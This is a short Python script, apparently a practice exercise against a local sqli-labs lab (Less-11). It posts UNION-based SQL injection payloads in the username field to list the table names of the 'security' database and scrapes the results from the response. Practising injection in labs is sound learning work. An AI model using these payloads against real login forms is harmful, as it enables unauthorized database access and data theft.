import requests
from lxml import etree
url = "http://127.0.0.1/Less-11/"
data = {
    #"uname":"kadmin' union select 1,database() #",
    #"passwd":"whaterver"
    "uname":"kadmin' union select 1, table_name from information_schema.tables where table_schema='security' limit 0,1 #",
    "passwd":"whaterver"
}
res = requests.post(url=url,data=data).text
html = etree.HTML(res)
result = html.xpath('//font/text()')
print result[2:4]